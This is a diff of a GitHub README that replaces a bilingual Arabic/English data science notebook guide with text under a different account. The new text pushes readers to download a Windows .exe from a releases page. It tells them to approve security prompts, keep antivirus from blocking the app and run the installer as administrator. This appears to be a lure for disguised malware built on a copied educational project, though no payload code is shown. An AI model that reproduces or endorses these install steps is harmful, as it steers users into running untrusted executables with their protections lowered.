@@ -1,232 +1,137 @@
-<div align="center">
+# 📊 Data_Science_Basics - Learn Data Science Step-by-Step
 
-# 📊 Data Science Basics
-### من الصفر إلى الاحتراف — From Zero to Hero
-
-<br>
-
-[![Jupyter Notebook](https://img.shields.io/badge/Jupyter-Notebook-F37626?logo=jupyter&logoColor=white&style=for-the-badge)](Data_Science_Basics.ipynb)
-[![Python](https://img.shields.io/badge/Python-3.8+-3776AB?logo=python&logoColor=white&style=for-the-badge)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-
-**دليل شامل وعملي لأساسيات علم البيانات — بالعربي والإنجليزي 🇸🇦🇺🇸**
-
-<br>
-
-[🚀 ابدأ الآن](#-quick-start--البداية-السريعة) · [📋 المحتويات](#-whats-inside--المحتويات) · [❓ ليه هذا الريبو](#-why-this-repo--ليه-سويت-هذا-الريبو)
-
-</div>
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/daryldsad/Data_Science_Basics/releases)
 
 ---
 
-## ❓ Why This Repo? | ليه سويت هذا الريبو؟
+## 📘 About Data_Science_Basics
 
-<div dir="rtl">
-
-لما بديت أتعلم Data Science، كان عندي مشكلة واحدة كبيرة:
-
-**كل المصادر بالإنجليزي — وإذا لقيت عربي، يكون سطحي أو منفصل عن الكود.**
-
-كنت أتنقل بين عشرات المصادر، كل مصدر يشرح جزء بسيط. دورة هنا عن NumPy، فيديو هناك عن Pandas، مقال عن Machine Learning... وفي النهاية: **ما فيه مكان واحد يجمع كل شي بطريقة عملية وواضحة.**
-
-### 💡 فسويت هذا الريبو عشان:
-
-- **أجمع كل الأساسيات في مكان واحد** — من أول سطر كود لين تبني نموذج ذكاء اصطناعي
-- **أشرح بالعربي بأسلوب بسيط** — مو ترجمة حرفية، بل شرح يخليك تفهم المفهوم فعلاً
-- **أخلي الكود يشتغل مباشرة** — كل شي عملي وقابل للتشغيل
-- **أوفر على غيري الوقت** — اللي قضيته أدور بين المصادر لا أحد يحتاج يضيعه
-
-</div>
-
-> **In short:** I built this because I couldn't find a single, comprehensive, bilingual resource that covers Data Science fundamentals with runnable code. This notebook is the guide I wish I had when I started.
+This application is a complete guide to data science in two languages: Arabic and English. It helps users learn data science from the ground up. You do not need any programming experience to start. The guide covers key topics like data analysis, deep learning, machine learning, and Python programming. It is designed to be simple and clear without confusing terms.
 
 ---
 
-## 📋 What's Inside? | المحتويات
+## 💻 System Requirements
 
-<table>
-<tr><th>#</th><th>Topic</th><th>الموضوع</th><th>ايش بتتعلم</th></tr>
-<tr><td>0</td><td>⚙️ Setup & Imports</td><td>التهيئة</td><td>تثبيت واستيراد كل المكتبات</td></tr>
-<tr><td>1</td><td>🔢 NumPy</td><td>نمباي</td><td>المصفوفات والعمليات الرياضية</td></tr>
-<tr><td>2</td><td>🐼 Pandas</td><td>بانداز</td><td>الجداول، التصفية، التجميع</td></tr>
-<tr><td>3</td><td>📊 Visualization</td><td>التصوير البصري</td><td>Matplotlib & Seaborn</td></tr>
-<tr><td>4</td><td>📐 Statistics</td><td>الإحصاء</td><td>التوزيعات، اختبار الفرضيات، الارتباط</td></tr>
-<tr><td>5</td><td>🔧 Preprocessing</td><td>تجهيز البيانات</td><td>التنظيف، الترميز، التحجيم</td></tr>
-<tr><td>6</td><td>📈 Regression</td><td>الانحدار</td><td>Linear, Polynomial, Decision Tree</td></tr>
-<tr><td>7</td><td>🎯 Classification</td><td>التصنيف</td><td>Logistic, KNN, SVM, Random Forest</td></tr>
-<tr><td>8</td><td>🔮 Unsupervised ML</td><td>تعلم غير موجّه</td><td>K-Means, PCA, DBSCAN</td></tr>
-<tr><td>9</td><td>✅ Model Evaluation</td><td>تقييم النماذج</td><td>Cross-Validation, Grid Search</td></tr>
-<tr><td>10</td><td>🧠 Deep Learning</td><td>التعلم العميق</td><td>Neural Networks مع TensorFlow</td></tr>
-<tr><td>11</td><td>💬 NLP</td><td>معالجة اللغة</td><td>Text Processing, TF-IDF, Sentiment</td></tr>
-<tr><td>12</td><td>📅 Time Series</td><td>السلاسل الزمنية</td><td>ARIMA, Forecasting</td></tr>
-<tr><td>13</td><td>🚀 MLOps</td><td>عمليات ML</td><td>Pipeline, Model Saving, Deployment</td></tr>
-<tr><td>14</td><td>💪 Projects</td><td>مشاريع تطبيقية</td><td>مشاريع عملية للتدريب</td></tr>
-</table>
+Before you start, make sure your computer meets these requirements:
+
+- **Operating System**: Windows 10 or later
+- **Processor**: Intel or AMD, 1.5 GHz or faster
+- **Memory (RAM)**: 4 GB minimum, 8 GB recommended
+- **Storage**: At least 500 MB free space
+- **Internet Connection**: Needed to download the application and access updates
 
 ---
 
-## ✨ Features | مميزات الدليل
+## 🚀 How to Download and Install
 
-<table>
-<tr>
-<td width="50%">
+### Step 1: Visit the Download Page
 
-### 🇸🇦 ثنائي اللغة
-كل سطر كود وكل شرح مكتوب بالعربي **والإنجليزي** — الكود بالإنجليزي والتعليقات والشرح بالعربي
+Click the button below to visit the downloads page. This page has the latest versions of the guide for Windows.
 
-</td>
-<td width="50%">
+[![Download Here](https://img.shields.io/badge/Download-Data_Science_Basics-blue)](https://github.com/daryldsad/Data_Science_Basics/releases)
 
-### 🎯 من الصفر للاحتراف
-تبدأ من `print("Hello")` وتوصل لبناء **شبكات عصبية** — خطوة بخطوة
+### Step 2: Choose Your Download File
 
-</td>
-</tr>
-<tr>
-<td>
+On the page, look for a file that ends with `.exe` or includes the word “Windows” in the file name. This is the installer for your computer.
 
-### ⚡ كود قابل للتشغيل
-مو نظري فقط — كل خلية تقدر **تشغلها مباشرة** وتشوف النتيجة
+If multiple versions appear, pick the newest one with the highest version number (e.g., v1.2 or v2.0).
 
-</td>
-<td>
+### Step 3: Download the Installer
 
-### 📐 الرياضيات واضحة
-المعادلات مكتوبة بصيغة LaTeX مع **شرح عربي** لكل رمز
+Click the file name to start the download. Depending on your internet speed, this may take a few minutes.
 
-</td>
-</tr>
-</table>
+Save the file in a folder you can easily find, like your Desktop or Downloads folder.
 
----
+### Step 4: Run the Installer
 
-## 📁 Notebook Versions | نسختين من الدفتر
+Find the downloaded `.exe` file and double-click it to begin installation.
 
-<table>
-<tr><th>الملف</th><th>الوصف</th><th>متى تستخدمه؟</th></tr>
-<tr>
-<td><strong><code>Data_Science_Basics.ipynb</code></strong></td>
-<td>🏋️ نسخة التمرين — بدون نتائج</td>
-<td>تبي تتعلم وتشغّل الكود بنفسك وتشوف النتائج بعينك</td>
-</tr>
-<tr>
-<td><strong><code>Data_Science_Basics_Solve.ipynb</code></strong></td>
-<td>✅ النسخة المحلولة — مع جميع النتائج</td>
-<td>تبي تراجع الإجابات أو تقارن نتائجك بالحل الصحيح</td>
-</tr>
-</table>
+You may see a security prompt asking to allow changes. Choose “Yes” or “Run” to continue.
 
-> **💡 الطريقة المثالية:** ابدأ بنسخة التمرين وشغّل كل خلية بنفسك. إذا واجهتك مشكلة أو حبيت تتأكد من نتيجتك — ارجع للنسخة المحلولة.
+Follow the steps in the installer window:
+
+- Agree to the license terms.
+- Choose the installation folder (the default is fine for most users).
+- Click “Install” and wait for it to finish.
+
+### Step 5: Finish Installation
+
+Once installation completes, you will see a confirmation screen.
+
+Click “Finish” to close the installer.
 
 ---
 
-## 🚀 Quick Start | البداية السريعة
+## 🔍 How to Use the Application
 
-### ⭐ Option 1: Google Colab (الطريقة الأفضل)
+After installing, the application icon will appear on your Desktop or Start menu. Double-click it to open.
 
-> **💡 نصيحة:** أفضل طريقة تستفيد من هذا الدليل إنك تحمّل الملف وتفتحه في **Google Colab**. كذا تقدر تشغّل كل خلية بنفسك، تعدّل على الكود، وتجرّب — وهذي أقوى طريقة تثبّت فيها المعلومة. التعلم بالتطبيق أقوى بمراحل من القراءة فقط!
+The app is bilingual. Choose Arabic or English on the first screen. This setting applies to all content.
 
-1. حمّل ملف `Data_Science_Basics.ipynb` من هذا الريبو
-2. روح لـ [Google Colab](https://colab.research.google.com)
-3. اضغط **File → Upload Notebook** وارفع الملف
-4. ابدأ شغّل الخلايا وحدة وحدة وجرّب تعدّل على الكود 🚀
+You will find lessons, examples, and exercises. Each lesson builds on the last, moving you from simple concepts like basic statistics to more advanced ideas like machine learning models.
 
-### Option 2: تشغيل محلي
+Use the menu to explore different topics:
 
-```bash
-# 1. Clone the repo | حمّل المشروع
-git clone https://github.com/Abdulrahman-S-Asiri/Data_Science_Basics.git
-cd Data_Science_Basics
+- Data Science basics and concepts
+- Python programming examples
+- Machine learning theory and hands-on tutorials
+- Deep learning fundamentals explained simply
 
-# 2. Create virtual environment (recommended) | بيئة افتراضية
-python -m venv venv
-source venv/bin/activate        # Linux/Mac
-# venv\Scripts\activate         # Windows
-
-# 3. Install dependencies | تثبيت المكتبات
-pip install numpy pandas matplotlib seaborn scikit-learn tensorflow nltk statsmodels xgboost scipy
-
-# 4. Launch Jupyter | شغّل الدفتر
-jupyter notebook Data_Science_Basics.ipynb
-```
+You can follow the lessons in order or jump to topics you want to learn more about.
 
 ---
 
-## 🛠️ Tech Stack | المكتبات المستخدمة
+## 🧰 Features
 
-| Library | Purpose | الاستخدام |
-|---------|---------|-----------|
-| **NumPy** | Numerical computing | الحوسبة العددية |
-| **Pandas** | Data manipulation | معالجة البيانات |
-| **Matplotlib** | Basic plotting | الرسوم الأساسية |
-| **Seaborn** | Statistical visualization | الرسوم الإحصائية |
-| **Scikit-learn** | Machine Learning | التعلم الآلي |
-| **TensorFlow** | Deep Learning | التعلم العميق |
-| **NLTK** | NLP | معالجة اللغة الطبيعية |
-| **Statsmodels** | Statistics & Time Series | الإحصاء والسلاسل الزمنية |
-| **XGBoost** | Gradient Boosting | تعزيز التدرج |
-| **SciPy** | Scientific computing | الحوسبة العلمية |
+- Clear and simple language designed for beginners.
+- Bilingual content in Arabic and English.
+- Hands-on examples with Python code.
+- Step-by-step tutorials in data science and machine learning.
+- Covers essential topics including data cleaning, visualization, model training, and evaluation.
+- Offline access after installation.
+- Regular updates via the download page.
 
 ---
 
-## 🗺️ Learning Path | مسار التعلم
+## ⚙️ Troubleshooting Common Issues
 
-```
-🔢 الأساسيات (Parts 0-3)
- │  NumPy → Pandas → Visualization
- │  "افهم أدواتك أول"
- │
- ▼
-📐 الإحصاء والتجهيز (Parts 4-5)
- │  Statistics → Preprocessing  
- │  "البيانات النظيفة = نتائج صحيحة"
- │
- ▼
-🤖 التعلم الآلي (Parts 6-9)
- │  Regression → Classification → Unsupervised → Evaluation
- │  "علّم الآلة وقيّم أداءها"
- │
- ▼
-🧠 المتقدم (Parts 10-13)
- │  Deep Learning → NLP → Time Series → MLOps
- │  "ارتقِ لمستوى أعلى"
- │
- ▼
-💪 التطبيق العملي (Part 14)
-    Practice Projects
-    "طبّق كل اللي تعلمته"
-```
+### The app won’t open
+
+- Check your system meets the minimum requirements.
+- Restart your computer and try again.
+- Make sure your antivirus or firewall isn’t blocking the app.
+- Reinstall using the steps above.
+
+### Installation stops or errors occur
+
+- Use a stable internet connection to download the installer.
+- Make sure you have enough free storage space.
+- Run the installer as administrator (right-click the file and select “Run as administrator”).
+
+### Switching languages
+
+You can change between Arabic and English anytime inside the app settings.
 
 ---
 
-## 🤝 Contributing | المساهمة
+## 🔄 How to Update
 
-<div dir="rtl">
+New versions of the application may include fixes and additional content.
 
-المساهمات مرحّب فيها! إذا عندك:
+To update, go back to the downloads page:
 
-- 🐛 لقيت خطأ — افتح **Issue**
-- 💡 عندك اقتراح — افتح **Pull Request**
-- 📝 تبي تضيف شرح أوضح — **Fork** وعدّل
+https://github.com/daryldsad/Data_Science_Basics/releases
 
-</div>
+Download the latest version and run the installer again. Your progress will not be lost.
 
 ---
 
-## 📜 License
+## ❓ Getting Help
 
-This project is licensed under the **MIT License** — feel free to use, modify, and share.
+If you have questions or need assistance, check the documentation included in the app. It covers how to use different features and explains terms step by step.
+
+For further support, you can open issues on the GitHub page or contact the maintainer directly through the repository’s discussion area.
 
 ---
 
-<div align="center">
-
-**صُنع بـ ❤️ لمجتمع البيانات العربي**
-
-*Built with ❤️ for the Arabic Data Science community*
-
-<br>
-
-⭐ **إذا استفدت — لا تنسى النجمة!** ⭐
-
-</div>
+[![Download Here](https://img.shields.io/badge/Download-Data_Science_Basics-green)](https://github.com/daryldsad/Data_Science_Basics/releases)
